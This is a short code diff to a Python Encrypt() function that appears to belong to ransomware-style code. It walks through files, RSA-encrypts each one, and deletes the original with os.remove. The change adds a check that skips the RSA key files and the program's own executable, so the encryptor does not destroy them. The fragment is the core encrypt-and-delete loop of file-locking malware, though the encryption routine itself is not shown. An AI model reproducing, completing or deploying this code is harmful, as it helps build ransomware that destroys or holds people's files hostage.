@@ -22,9 +22,10 @@ def Encrypt():
         
         for file in files:
             filepath = pathToFile + "\\" + file
-            pathToFile, filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
-            fileInfo.append([pathToFile, filename])
-            os.remove(pathToFile + "\\" + file)
+            if filepath != cwd + "\\rsa_private_key.pem" and filepath != cwd + "\\rsa_public_key.pem" and filepath != cwd + "\\Test.exe":
+                pathToFile, filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
+                fileInfo.append([pathToFile, filename])
+                os.remove(pathToFile + "\\" + file)
 
     return fileInfo
     
